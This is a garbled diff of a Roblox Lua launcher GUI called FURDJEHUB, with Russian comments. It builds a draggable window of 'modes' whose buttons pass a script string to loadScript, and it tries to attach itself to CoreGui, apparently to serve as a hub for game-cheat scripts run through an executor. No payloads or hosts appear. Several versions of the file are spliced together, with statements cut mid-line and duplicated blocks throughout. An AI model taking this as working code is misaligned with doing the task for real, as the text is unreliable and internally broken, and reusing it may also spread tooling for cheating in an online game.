-closeCorner.Parent = closeBtn
-
-closeBtn.MouseEnter:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-end)
-closeBtn.MouseLeave:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-end)
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- Кнопка сворачивания
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 50, 0, 50)
-toggleBtn.Position = UDim2.new(0, 15, 0, 15)
-toggleBtn.Text = "⚡"
-toggleBtn.TextSize = 22
-toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-toggleBtn.BorderSizePixel = 0
-toggleBtn.Parent = screenGui
-toggleBtn.Visible = true
-toggleBtn.Selectable = false
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 10)
-toggleCorner.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- Drag для заголовка
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        dragOffset = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(dragOffset.X.Scale, dragOffset.X.Offset + delta.X, dragOffset.Y.Scale, dragOffset.Y.Offset + delta.Y)
-    end
-end)
-
--- Контент
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -20, 1, -60)
-content.Position = UDim2.new(0, 10, 0, 55)
-content.BackgroundTransparency = 1
-content.Parent = window
-
--- Скроллинг
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, 0, 1, 0)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.ScrollBarThickness = 6
-scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
-scrollFrame.BorderSizePixel = 0
-scrollFrame.Parent = content
-
-local canvas = Instance.new("Frame")
-canvas.Size = UDim2.new(1, 0, 0, 0)
-canvas.BackgroundTransparency = 1
-canvas.Parent = scrollFrame
-
-local canvasY = 5
-
--- ===== СОЗДАНИЕ КНОПОК РЕЖИМОВ =====
-local function createModeButton(mode, index)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 60)
-    btn.Position = UDim2.new(0, 5, 0, canvasY)
-    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    btn.BorderSizePixel = 0
-    btn.Parent = canvas
-    btn.Selectable = false
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-    
-    -- Название
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    nameLabel.Position = UDim2.new(0, 10, 0, 5)
-    nameLabel.Text = mode.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    nameLabel.TextSize = 16
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Parent = btn
-    
-    -- Описание
-    local descLabel = Instance.new("TextLabel")
-    descLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    descLabel.Position = UDim2.new(0, 10, 0.5, 0)
-    descLabel.Text = mode.Description
-    descLabel.TextColor3 = Color3.fromRGB(150, 150, 180)
-    descLabel.TextSize = 12
-    descLabel.Font = Enum.Font.Gotham
-    descLabel.TextXAlignment = Enum.TextXAlignment.Left
-    descLabel.BackgroundTransparency = 1
-    descLabel.Parent = btn
-    
-    -- Кнопка запуска
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 90, 0, 32)
-    launchBtn.Position = UDim2.new(1, -100, 0.5, -16)
-    launchBtn.Text = "▶ ЗАПУСК"
-    launchBtn.TextSize = 12
-    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 70)
-    launchBtn.BorderSizePixel = 0
-    launchBtn.Parent = btn
-    launchBtn.Selectable = false
-    
-    local launchCorner = Instance.new("UICorner")
-    launchCorner.CornerRadius = UDim.new(0, 6)
-    launchCorner.Parent = launchBtn
-    
-    -- Статус
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0, 80, 0, 20)
-    statusLabel.Position = UDim2.new(1, -190, 0.5, -10)
-    statusLabel.Text = "●"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-    statusLabel.TextSize = 20
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = btn
-    
-    -- Ховер эффект
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    end)
-    
-    -- Запуск
-    launchBtn.MouseButton1Click:Connect(function()
-        statusLabel.Text = "● ЗАГРУЗКА..."
-        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-        
-        if mode.Script and mode.Script \~= "" then
-            screenGui:Destroy()
-            loadScript(mode.Script)
-        else
-            statusLabel.Text = "● НЕТ СКРИПТА"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен!", Color3.fromRGB(200, 150, 40))
-            task.wait(1.5)
-            statusLabel.Text = "●"
-            statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-        end
-    end)
-    
-    canvasY = canvasY + 70
-    canvas.Size = UDim2.new(1, 0, 0, canvasY)
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, canvasY + 10)
-    
-    return btn
-end
-
--- Создаем кнопки для всех режимов
-for i, mode in ipairs(Modes) do
-    createModeButton(mode, i)
-end
-
--- Информация внизу
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -20, 0, 20)
-footer.Position = UDim2.new(0, 10, 1, -30)
-footer.Text = "FURDJEHUB v2.0 | Выбери режим и нажми ▶ ЗАПУСК"
-footer.TextColor3 = Color3.fromRGB(100, 100, 130)
-footer.TextSize = 11
-footer.BackgroundTransparency = 1
-footer.Font = Enum.Font.Gotham
-footer.Parent = content
-
-print("⚡ FURDJEHUB Launcher v2.0 loaded!")
-print("📌 Всего режимов: " .. #Modes)
-print("💡 Нажми ▶ ЗАПУСК для загрузки скрипта")if not screenGui.Parent then
+if not success then
     screenGui.Parent = player:WaitForChild("PlayerGui")
 end
 
 -- Главное окно
 local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 580, 0, 390)
-window.Position = UDim2.new(0.5, -290, 0.5, -195)
+window.Size = UDim2.new(0, 580, 0, 400)
+window.Position = UDim2.new(0.5, -290, 0.5, -200)
 window.BackgroundColor3 = Color3.fromRGB(16, 16, 26)
 window.BorderSizePixel = 0
+window.Visible = true
 window.Parent = screenGui
 
 local windowCorner = Instance.new("UICorner")
@@ -1752,22 +206,22 @@ titleCorner.CornerRadius = UDim.new(0, 14)
 titleCorner.Parent = titleBar
 
 local titleFix = Instance.new("Frame")
-titleFix.Size = UDim2.new(1, 0, 0, 18)
-titleFix.Position = UDim2.new(0, 0, 1, -18)
+titleFix.Size = UDim2.new(1, 0, 0, 20)
+titleFix.Position = UDim2.new(0, 0, 1, -20)
 titleFix.BackgroundColor3 = Color3.fromRGB(24, 24, 40)
 titleFix.BorderSizePixel = 0
 titleFix.Parent = titleBar
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -60, 1, 0)
-title.Position = UDim2.new(0, 16, 0, 0)
-title.BackgroundTransparency = 1
-title.Text = "⚡ FURDJEHUB"
-title.TextColor3 = Color3.fromRGB(255, 210, 70)
-title.TextSize = 19
-title.Font = Enum.Font.GothamBold
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = titleBar
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(1, -60, 1, 0)
+titleText.Position = UDim2.new(0, 16, 0, 0)
+titleText.BackgroundTransparency = 1
+titleText.Text = "⚡ FURDJEHUB"
+titleText.TextColor3 = Color3.fromRGB(255, 210, 70)
+titleText.TextSize = 19
+titleText.Font = Enum.Font.GothamBold
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.Parent = titleBar
 
 -- Кнопка закрытия
 local closeBtn = Instance.new("TextButton")
@@ -1785,12 +239,6 @@ local closeCorner = Instance.new("UICorner")
 closeCorner.CornerRadius = UDim.new(0, 8)
 closeCorner.Parent = closeBtn
 
-closeBtn.MouseEnter:Connect(function()
-    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(230, 60, 60)}):Play()
-end)
-closeBtn.MouseLeave:Connect(function()
-    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(190, 45, 45)}):Play()
-end)
 closeBtn.MouseButton1Click:Connect(function()
     screenGui:Destroy()
 end)
@@ -1821,7 +269,10 @@ toggleBtn.MouseButton1Click:Connect(function()
 end)
 
 -- Перетаскивание
-local dragging, dragStart, startPos
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
 titleBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         dragging = true
@@ -1829,33 +280,55 @@ titleBar.InputBegan:Connect(function(input)
         startPos = window.Position
     end
 end)
+
 titleBar.InputEnded:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         dragging = false
     end
 end)
+
 UserInputService.InputChanged:Connect(function(input)
     if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
         local delta = input.Position - dragStart
-        window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        window.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
     end
 end)
 
--- Контент (без скролла)
+-- Контент
 local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -24, 1, -68)
-content.Position = UDim2.new(0, 12, 0, 54)
+content.Size = UDim2.new(1, -20, 1, -66)
+content.Position = UDim2.new(0, 10, 0, 54)
 content.BackgroundTransparency = 1
+content.ClipsDescendants = true
 content.Parent = window
 
-local y = 0
-for i, mode in ipairs(Modes) do
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Size = UDim2.new(1, 0, 1, 0)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.ScrollBarThickness = 5
+scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
+scrollFrame.BorderSizePixel = 0
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollFrame.Parent = content
+
+local canvas = Instance.new("Frame")
+canvas.Size = UDim2.new(1, 0, 0, 0)
+canvas.BackgroundTransparency = 1
+canvas.Parent = scrollFrame
+
+local y = 5
+for _, mode in ipairs(Modes) do
     local btn = Instance.new("Frame")
-    btn.Size = UDim2.new(1, 0, 0, 52)
-    btn.Position = UDim2.new(0, 0, 0, y)
+    btn.Size = UDim2.new(1, -10, 0, 58)
+    btn.Position = UDim2.new(0, 5, 0, y)
     btn.BackgroundColor3 = Color3.fromRGB(28, 28, 46)
     btn.BorderSizePixel = 0
-    btn.Parent = content
+    btn.Parent = canvas
 
     local btnCorner = Instance.new("UICorner")
     btnCorner.CornerRadius = UDim.new(0, 10)
@@ -1863,7 +336,7 @@ for i, mode in ipairs(Modes) do
 
     local nameLabel = Instance.new("TextLabel")
     nameLabel.Size = UDim2.new(1, -120, 0, 24)
-    nameLabel.Position = UDim2.new(0, 14, 0, 5)
+    nameLabel.Position = UDim2.new(0, 14, 0, 4)
     nameLabel.BackgroundTransparency = 1
     nameLabel.Text = mode.Name
     nameLabel.TextColor3 = Color3.fromRGB(240, 240, 255)
@@ -1884,8 +357,8 @@ for i, mode in ipairs(Modes) do
     descLabel.Parent = btn
 
     local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 92, 0, 30)
-    launchBtn.Position = UDim2.new(1, -106, 0.5, -15)
+    launchBtn.Size = UDim2.new(0, 90, 0, 30)
+    launchBtn.Position = UDim2.new(1, -100, 0.5, -15)
     launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
     launchBtn.Text = "▶ ЗАПУСК"
     launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -1898,7 +371,6 @@ for i, mode in ipairs(Modes) do
     launchCorner.CornerRadius = UDim.new(0, 8)
     launchCorner.Parent = launchBtn
 
-    -- Ховер
     btn.MouseEnter:Connect(function()
         TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(36, 36, 58)}):Play()
     end)
@@ -1914,7 +386,7 @@ for i, mode in ipairs(Modes) do
     end)
 
     launchBtn.MouseButton1Click:Connect(function()
-        if mode.Script and mode.Script \~= "" then
+        if mode.Script and mode.Script ~= "" then
             screenGui:Destroy()
             loadScript(mode.Script)
         else
@@ -1922,681 +394,20 @@ for i, mode in ipairs(Modes) do
         end
     end)
 
-    y = y + 58
+    y = y + 66
 end
 
--- Футер
+canvas.Size = UDim2.new(1, 0, 0, y + 10)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, y + 10)
+
 local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -24, 0, 18)
-footer.Position = UDim2.new(0, 12, 1, -26)
+footer.Size = UDim2.new(1, -20, 0, 20)
+footer.Position = UDim2.new(0, 10, 1, -26)
 footer.BackgroundTransparency = 1
-footer.Text = "FURDJEHUB  •  Выбери режим и нажми ЗАПУСК"
+footer.Text = "FURDJEHUB v2.0 | Выбери режим → ЗАПУСК"
 footer.TextColor3 = Color3.fromRGB(100, 105, 135)
 footer.TextSize = 12
 footer.Font = Enum.Font.Gotham
 footer.Parent = window
 
-print("⚡ FURDJEHUB загружен — всё помещается без скролла")    else
-        showNotification("⚠️ Скрипт для этого режима не добавлен", Color3.fromRGB(200, 140, 40))
-    end
-end
-
--- ===== СОЗДАНИЕ GUI =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FurdjehubLauncher2"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.DisplayOrder = 999
-
--- Важно: сначала пробуем CoreGui
-local parentSuccess = pcall(function()
-    screenGui.Parent = CoreGui
-end)
-
-if not parentSuccess then
-    screenGui.Parent = player:WaitForChild("PlayerGui")
-    print("⚠ Положил в PlayerGui")
-else
-    print("✅ Положил в CoreGui")
-end
-
--- Главное окно
-local window = Instance.new("Frame")
-window.Name = "MainWindow"
-window.Size = UDim2.new(0, 600, 0, 400)
-window.Position = UDim2.new(0.5, -300, 0.5, -200)
-window.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
-window.BorderSizePixel = 0
-window.Visible = true
-window.Parent = screenGui
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 14)
-windowCorner.Parent = window
-
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(60, 60, 95)
-stroke.Thickness = 1.5
-stroke.Parent = window
-
--- Заголовок
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 48)
-titleBar.BackgroundColor3 = Color3.fromRGB(26, 26, 42)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 14)
-titleCorner.Parent = titleBar
-
-local titleFix = Instance.new("Frame")
-titleFix.Size = UDim2.new(1, 0, 0, 20)
-titleFix.Position = UDim2.new(0, 0, 1, -20)
-titleFix.BackgroundColor3 = Color3.fromRGB(26, 26, 42)
-titleFix.BorderSizePixel = 0
-titleFix.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -60, 1, 0)
-titleText.Position = UDim2.new(0, 18, 0, 0)
-titleText.BackgroundTransparency = 1
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 210, 70)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 34, 0, 34)
-closeBtn.Position = UDim2.new(1, -42, 0.5, -17)
-closeBtn.BackgroundColor3 = Color3.fromRGB(190, 45, 45)
-closeBtn.Text = "✕"
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.TextSize = 16
-closeBtn.Font = Enum.Font.GothamBold
-closeBtn.AutoButtonColor = false
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 8)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- Плавающая кнопка (чтобы можно было открыть обратно)
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 46, 0, 46)
-toggleBtn.Position = UDim2.new(0, 15, 0, 15)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 42)
-toggleBtn.Text = "⚡"
-toggleBtn.TextColor3 = Color3.fromRGB(255, 220, 80)
-toggleBtn.TextSize = 20
-toggleBtn.Font = Enum.Font.GothamBold
-toggleBtn.AutoButtonColor = false
-toggleBtn.Parent = screenGui
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 12)
-toggleCorner.Parent = toggleBtn
-
-local toggleStroke = Instance.new("UIStroke")
-toggleStroke.Color = Color3.fromRGB(80, 80, 120)
-toggleStroke.Thickness = 1.5
-toggleStroke.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- Перетаскивание
-local dragging, dragStart, startPos
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
--- Контент
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -24, 1, -70)
-content.Position = UDim2.new(0, 12, 0, 56)
-content.BackgroundTransparency = 1
-content.Parent = window
-
-local yPos = 0
-
-for i, mode in ipairs(Modes) do
-    local btn = Instance.new("Frame")
-    btn.Size = UDim2.new(1, 0, 0, 54)
-    btn.Position = UDim2.new(0, 0, 0, yPos)
-    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 48)
-    btn.BorderSizePixel = 0
-    btn.Parent = content
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 10)
-    btnCorner.Parent = btn
-    
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -130, 0, 26)
-    nameLabel.Position = UDim2.new(0, 14, 0, 6)
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Text = mode.Name
-    nameLabel.TextColor3 = Color3.fromRGB(240, 240, 255)
-    nameLabel.TextSize = 15
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.Parent = btn
-    
-    local descLabel = Instance.new("TextLabel")
-    descLabel.Size = UDim2.new(1, -130, 0, 18)
-    descLabel.Position = UDim2.new(0, 14, 0, 30)
-    descLabel.BackgroundTransparency = 1
-    descLabel.Text = mode.Description
-    descLabel.TextColor3 = Color3.fromRGB(140, 145, 175)
-    descLabel.TextSize = 12
-    descLabel.Font = Enum.Font.Gotham
-    descLabel.TextXAlignment = Enum.TextXAlignment.Left
-    descLabel.Parent = btn
-    
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 96, 0, 32)
-    launchBtn.Position = UDim2.new(1, -110, 0.5, -16)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 155, 80)
-    launchBtn.Text = "▶  ЗАПУСК"
-    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    launchBtn.TextSize = 13
-    launchBtn.Font = Enum.Font.GothamBold
-    launchBtn.AutoButtonColor = false
-    launchBtn.Parent = btn
-    
-    local launchCorner = Instance.new("UICorner")
-    launchCorner.CornerRadius = UDim.new(0, 8)
-    launchCorner.Parent = launchBtn
-    
-    launchBtn.MouseButton1Click:Connect(function()
-        if mode.Script and mode.Script \~= "" then
-            screenGui:Destroy()
-            loadScript(mode.Script)
-        else
-            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен", Color3.fromRGB(200, 140, 40))
-        end
-    end)
-    
-    yPos = yPos + 62
-end
-
--- Футер
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -24, 0, 20)
-footer.Position = UDim2.new(0, 12, 1, -28)
-footer.BackgroundTransparency = 1
-footer.Text = "FURDJEHUB v2.2  •  Выбери режим и нажми ЗАПУСК"
-footer.TextColor3 = Color3.fromRGB(95, 100, 130)
-footer.TextSize = 12
-footer.Font = Enum.Font.Gotham
-footer.Parent = window
-
-print("⚡ FURDJEHUB Launcher v2.2 загружен!")
-print("Окно должно быть видно в центре экрана")                print("✅ Скрипт успешно загружен!")
-            else
-                error("Не удалось скомпилировать скрипт")
-            end
-        end)
-        
-        if not success then
-            warn("❌ Ошибка загрузки скрипта: " .. tostring(err))
-            showNotification("❌ Ошибка загрузки скрипта!", Color3.fromRGB(200, 50, 50))
-        end
-    else
-        showNotification("⚠️ Скрипт для этого режима не добавлен", Color3.fromRGB(200, 140, 40))
-    end
-end
-
--- ===== СОЗДАНИЕ GUI =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FurdjehubLauncher2"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
--- Главное окно 600x400
-local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 600, 0, 400)
-window.Position = UDim2.new(0.5, -300, 0.5, -200)
-window.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
-window.BorderSizePixel = 0
-window.Parent = screenGui
-window.Active = true
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 14)
-windowCorner.Parent = window
-
--- Лёгкая обводка
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(55, 55, 85)
-stroke.Thickness = 1.5
-stroke.Transparency = 0.3
-stroke.Parent = window
-
--- ===== ЗАГОЛОВОК =====
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 48)
-titleBar.BackgroundColor3 = Color3.fromRGB(26, 26, 42)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 14)
-titleCorner.Parent = titleBar
-
--- Чтобы нижние углы заголовка не были круглыми
-local titleFix = Instance.new("Frame")
-titleFix.Size = UDim2.new(1, 0, 0, 16)
-titleFix.Position = UDim2.new(0, 0, 1, -16)
-titleFix.BackgroundColor3 = Color3.fromRGB(26, 26, 42)
-titleFix.BorderSizePixel = 0
-titleFix.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -90, 1, 0)
-titleText.Position = UDim2.new(0, 18, 0, 0)
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 210, 70)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.BackgroundTransparency = 1
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 34, 0, 34)
-closeBtn.Position = UDim2.new(1, -42, 0.5, -17)
-closeBtn.Text = "✕"
-closeBtn.TextSize = 16
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.BackgroundColor3 = Color3.fromRGB(190, 45, 45)
-closeBtn.BorderSizePixel = 0
-closeBtn.AutoButtonColor = false
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 8)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseEnter:Connect(function()
-    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(230, 60, 60)}):Play()
-end)
-closeBtn.MouseLeave:Connect(function()
-    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(190, 45, 45)}):Play()
-end)
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- ===== ПЛАВАЮЩАЯ КНОПКА =====
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 48, 0, 48)
-toggleBtn.Position = UDim2.new(0, 18, 0, 18)
-toggleBtn.Text = "⚡"
-toggleBtn.TextSize = 22
-toggleBtn.TextColor3 = Color3.fromRGB(255, 220, 80)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 42)
-toggleBtn.BorderSizePixel = 0
-toggleBtn.AutoButtonColor = false
-toggleBtn.Parent = screenGui
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 12)
-toggleCorner.Parent = toggleBtn
-
-local toggleStroke = Instance.new("UIStroke")
-toggleStroke.Color = Color3.fromRGB(70, 70, 110)
-toggleStroke.Thickness = 1.5
-toggleStroke.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- ===== DRAG =====
-local dragging = false
-local dragStart, startPos
-
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
--- ===== КОНТЕНТ =====
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -24, 1, -70)
-content.Position = UDim2.new(0, 12, 0, 56)
-content.BackgroundTransparency = 1
-content.Parent = window
-
-local listLayout = Instance.new("UIListLayout")
-listLayout.Padding = UDim.new(0, 8)
-listLayout.SortOrder = Enum.SortOrder.LayoutOrder
-listLayout.Parent = content
-
--- ===== СОЗДАНИЕ КНОПОК РЕЖИМОВ =====
-local function createModeButton(mode, index)
-    local btn = Instance.new("Frame")
-    btn.Size = UDim2.new(1, 0, 0, 54)
-    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 48)
-    btn.BorderSizePixel = 0
-    btn.    label.Parent = frame
-    
-    task.wait(2.5)
-    notif:Destroy()
-end
-
--- ===== СОЗДАНИЕ GUI =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FurdjehubLauncher2"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
--- Главное окно 600x420
-local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 600, 0, 420)
-window.Position = UDim2.new(0.5, -300, 0.5, -210)
-window.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-window.BackgroundTransparency = 0
-window.BorderSizePixel = 0
-window.Parent = screenGui
-window.Visible = true
-window.Active = true
-window.Selectable = false
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 10)
-windowCorner.Parent = window
-
--- Тень
-local shadow = Instance.new("Frame")
-shadow.Size = UDim2.new(1, 10, 1, 10)
-shadow.Position = UDim2.new(0, -5, 0, -5)
-shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.5
-shadow.BorderSizePixel = 0
-shadow.ZIndex = -1
-shadow.Parent = window
-
--- Drag functionality
-local dragging = false
-local dragStart = nil
-local dragOffset = nil
-
--- Заголовок
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 45)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
